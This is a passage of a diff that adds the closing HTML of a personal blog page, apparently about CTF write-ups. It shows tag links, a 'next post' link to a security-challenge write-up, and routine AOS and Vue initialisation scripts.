+                  <a href="https://boooook123.github.io/Artone.github.io/tag/mn3LSQ-kQS/" class="tag">
+                    xxd命令
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/xy8ur52MZS/" class="tag">
+                    MySQL的原始数据文件
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/_7s7Vrkzq/" class="tag">
+                    MISC
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/1gSyFnTeaS/" class="tag">
+                    流量取证
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/gh05R7cM0/" class="tag">
+                    CTF
+                  </a>
+                
+                  <a href="https://boooook123.github.io/Artone.github.io/tag/3cJUATMNRB/" class="tag">
+                    WEB
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://boooook123.github.io/Artone.github.io/post/b-zhan-1024-an-quan-gong-fang-tiao-zhan-sai/">
+                  <h3 class="post-title">
+                    b站1024安全攻防挑战赛
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
